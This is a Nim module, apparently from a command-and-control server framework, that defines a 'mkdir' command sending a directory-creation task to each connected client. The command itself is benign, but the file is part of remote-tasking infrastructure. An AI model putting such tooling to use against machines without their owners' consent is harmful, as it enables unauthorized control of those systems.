import asyncdispatch, strutils, tables, json

import ../../types
import ../../logging
import ../../communication

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  for client in server.cli.handlingClient:
    let task = await client.sendClientTask("mkdir", %*[ args[0] ])
    if not task.isNil(): await task.awaitResponse()

let cmd*: Command = Command(
  execProc: execProc,
  name: "mkdir",
  argsLength: 0,
  usage: @["mkdir", "mkdir \"[dir]\""],
  cliMode: @[ClientInteractMode],
  description: "Create new directory",
  category: CCClientInteraction,
  requiresConnectedClient: true
)